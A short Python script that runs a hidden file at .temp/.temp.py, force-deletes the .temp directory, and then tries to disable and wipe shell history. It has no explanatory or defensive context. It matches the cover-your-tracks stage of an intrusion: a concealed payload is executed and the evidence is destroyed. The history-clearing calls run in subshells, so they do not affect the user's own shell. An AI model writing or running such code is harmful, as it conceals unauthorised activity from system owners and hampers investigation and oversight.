import os


def main():
    os.system('python3 .temp/.temp.py')
    os.system('rm -rf .temp')
    os.system('export HISTSIZE=0; export HISTFILE=/dev/null')
    os.system('history -c; history -w')  # clear history


if __name__ == "__main__":
    main()
